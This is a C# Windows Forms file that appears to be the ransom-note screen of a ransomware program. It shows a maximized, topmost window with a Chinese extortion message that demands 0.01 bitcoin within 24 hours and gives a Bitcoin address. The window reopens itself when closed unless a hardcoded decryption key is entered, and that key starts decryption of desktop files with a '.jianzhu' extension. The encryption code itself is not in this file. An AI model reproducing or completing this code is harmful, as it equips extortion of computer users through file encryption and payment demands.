using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace MyProject1
{
    public partial class Form1 : Form
    {
        public static void Ee()
        {



            Form1 form1 = new Form1();


            form1.ShowDialog();


        }




        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.label1.Text = "你的电脑被勒索了。请不要动任何东西，以免二次加密。不要想着破解。非对称加密无法破解。请在24小时之内缴纳赎金0.01比特币。否则就别想打开了";

            this.TopMost = true;
            this.WindowState= FormWindowState.Maximized;
            this.textBox1.Text = "发送比特币时在说明中留下邮箱。我会在邮箱中给你密钥。比特币地址：bc1qvrfsrnv4dgkhgd4vcxerw8nqv6kxhggxndf6mw";
            //bc1qvrfsrnv4dgkhgd4vcxerw8nqv6kxhggxndf6mw
            this.textBox2.Text = "输入解密密钥iniawnafyuiN";
            this.Size = new System.Drawing.Size(Convert.ToInt32(SystemParameters.WorkArea.Height), Convert.ToInt32(SystemParameters.WorkArea.Width));
            this.AllowDrop = false;
            this.label1.AllowDrop = false;
            this.textBox1.AllowDrop = false;
            this.textBox2.AllowDrop = false;
            this.button1.AllowDrop = false;
           


        }


        //退出按键
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = System.Windows.Forms.MessageBox.Show("是否退出?", "提示:", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);

            if (dr == DialogResult.OK)   //如果单击“是”按钮
            {
                e.Cancel = false;
                if (this.textBox2.Text != "iniawnafyuiN")
                {

                    Thread newThread = new Thread(Ee);
                    newThread.SetApartmentState(System.Threading.ApartmentState.STA);
                    newThread.Name = "ActiveXThread";
                    newThread.Start();
                }
                // Form1 form2 = new Form1();
                // form2.ShowDialog();
                //关闭窗体
            }
            else if (dr == DialogResult.Cancel)
            {
                e.Cancel = true;                  //不执行操作
            }
        }











        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click_1(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (this.textBox2.Text == "iniawnafyuiN")
            {
                StreamReader srReadFileq = new StreamReader(@"PrivateKey.xml");
                string PublicKey = srReadFileq.ReadToEnd();
                srReadFileq.Close();

                StreamReader srReadFileqq = new StreamReader(@"PrivateKey.xml");
                string PrivateKey = srReadFileqq.ReadToEnd();
                srReadFileqq.Close();

                T t2 = new T(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.jianzhu");
                t2.PublicKey = PublicKey;
                t2.PrivateKey = PrivateKey;

                //List<string> j = new List<string>();
                //t.Fu(ref  j);



                Thread t3 = new Thread(new ThreadStart(t2.jie2));

                t3.Start();


            }

            else {


                System.Windows.Forms.MessageBox.Show("解密失败！");
            }
        }
    }
}
